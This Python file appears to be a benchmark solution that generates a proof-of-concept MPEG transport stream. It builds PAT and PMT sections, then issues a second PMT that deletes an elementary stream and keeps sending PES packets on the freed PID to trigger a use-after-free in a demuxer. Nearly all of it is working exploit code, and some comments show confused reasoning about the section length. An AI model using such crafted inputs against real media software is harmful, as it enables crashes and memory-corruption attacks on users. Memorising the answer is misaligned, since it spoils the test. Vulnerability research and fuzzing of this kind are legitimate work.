import struct, zlib, tarfile, io, os, sys, tempfile, itertools

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper to compute MPEG-TS CRC32 (ISO/IEC 13818-1, not reflected)
        def psi_crc32(data: bytes) -> int:
            poly = 0x04C11DB7
            crc = 0xFFFFFFFF
            for byte in data:
                crc ^= byte << 24
                for _ in range(8):
                    crc = ((crc << 1) ^ poly) & 0xFFFFFFFF if (crc & 0x80000000) else (crc << 1) & 0xFFFFFFFF
            return crc & 0xFFFFFFFF

        # Build a PSI section (PAT/PMT). 'payload' must include the bytes following section_length field up to CRC exclusive
        def build_section(table_id: int, payload: bytes) -> bytes:
            # section_syntax_indicator=1, zero=0, reserved='11'
            section_length = len(payload) + 5  # 3 bytes after section_length up to CRC inclusive? Wait: We'll append CRC later
            # Actually we will compute CRC later; Add 4 bytes
            section_length += 4
            sec_len_field = 0xB000 | section_length  # 0b1011 << 12 | length
            header = struct.pack(">BH", table_id, sec_len_field)
            sec = header + payload
            crc_val = psi_crc32(sec)
            sec += struct.pack(">I", crc_val)
            return sec

        # Build PAT Section
        ts_id = 1
        version = 0
        pm_pid = 0x0100
        pat_payload = struct.pack(">H", ts_id)                   # transport_stream_id
        pat_payload += struct.pack("B", 0xC1 | (version << 1))   # '11' reserved, version, current_next_indicator=1
        pat_payload += b"\x00\x00"                               # section_number, last_section_number
        pat_payload += struct.pack(">H", 1)                      # program_number
        pat_payload += struct.pack(">H", 0xE000 | pm_pid)        # '111' reserved + PMT PID
        pat_section = build_section(0x00, pat_payload)

        # Build PMT v0 with ES PID 0x0101
        pcr_pid = 0x0101
        es_pid = 0x0101
        pmt_payload_v0 = struct.pack(">H", 1)                    # program_number
        pmt_payload_v0 += struct.pack("B", 0xC1 | (0 << 1))      # reserved, version=0, current=1
        pmt_payload_v0 += b"\x00\x00"                            # section_number, last_section_number
        pmt_payload_v0 += struct.pack(">H", 0xE000 | pcr_pid)    # PCR PID
        pmt_payload_v0 += b"\xF0\x00"                            # program_info_length = 0
        # ES entry
        pmt_payload_v0 += b"\x1B"                                # stream_type (H.264)
        pmt_payload_v0 += struct.pack(">H", 0xE000 | es_pid)     # Elementary PID
        pmt_payload_v0 += b"\xF0\x00"                            # ES_info_length = 0
        pmt_section_v0 = build_section(0x02, pmt_payload_v0)

        # Build PMT v1 without any ES (to trigger deletion)
        pmt_payload_v1 = struct.pack(">H", 1)                    # program_number
        pmt_payload_v1 += struct.pack("B", 0xC1 | (1 << 1))      # version=1
        pmt_payload_v1 += b"\x00\x00"                            # section_number, last_section_number
        pmt_payload_v1 += struct.pack(">H", 0xE000 | 0x1FFF)     # PCR PID set to 0x1FFF (null)
        pmt_payload_v1 += b"\xF0\x00"                            # program_info_length = 0
        pmt_section_v1 = build_section(0x02, pmt_payload_v1)

        # Build a simple PES header (start code)
        pes_header = b"\x00\x00\x01\xe0" + b"\x00\x00" + b"\x80\x00\x00"  # minimal PES

        # Helper to create a TS packet
        def make_ts(pid: int, payload: bytes, pusi: bool, cc: int) -> bytes:
            adaptation_field_control = 1  # payload only
            header = bytearray(4)
            header[0] = 0x47
            header[1] = ((0 << 7) | (pusi << 6) | (0 << 5) | ((pid >> 8) & 0x1F))
            header[2] = pid & 0xFF
            header[3] = (0 << 6) | (adaptation_field_control << 4) | (cc & 0x0F)
            packet = bytes(header)
            packet += payload
            if len(packet) < 188:
                packet += b"\xFF" * (188 - len(packet))
            return packet[:188]

        packets = []

        # Packet 1: PAT
        packets.append(make_ts(0x0000, b"\x00" + pat_section, True, 0))

        # Packet 2: PMT v0
        packets.append(make_ts(pm_pid, b"\x00" + pmt_section_v0, True, 0))

        # Packet 3: PES start for ES PID 0x0101
        packets.append(make_ts(es_pid, pes_header, True, 0))

        # Packet 4: PMT v1 (deletes ES)
        packets.append(make_ts(pm_pid, b"\x00" + pmt_section_v1, True, 1))

        # Packet 5: More PES on deleted PID (UAF trigger)
        packets.append(make_ts(es_pid, pes_header, True, 1))

        # Packet 6: Another PES continuation
        packets.append(make_ts(es_pid, b"\x00\x00\x00\x00\x00", False, 2))

        poc = b"".join(packets)
        return poc
